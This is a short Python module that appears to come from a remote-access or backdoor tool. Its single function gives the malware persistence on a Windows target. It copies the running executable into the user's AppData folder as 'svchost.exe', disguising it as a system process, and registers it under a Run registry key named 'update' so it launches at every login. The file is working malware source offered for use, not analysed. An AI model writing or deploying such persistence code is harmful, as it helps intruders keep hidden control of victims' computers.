from setting import *


# persistence functions #######################################################################################################
def persist_reg():
    if os_type == 'windows':
        try:
            location = os.environ["appdata"] + '\\svchost.exe'
            if not os.path.exists(location):
                shutil.copyfile(sys.executable, location)
                subprocess.call(
                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',
                    shell=True)
                return "\n\033[1;32;32m[+]\x1b[0m persistance access activated \033[1;32;32m[+]\n\x1b[0m"
        except:
            return "\n\033[1;32;31m[!]\x1b[0m failed to set persistance access \033[1;32;31m[!]\n\x1b[0m"
    else:
        return "\n\033[1;32;33m[!]\x1b[0m target is not a windows machine \033[1;32;33m[!]\n\x1b[0m"
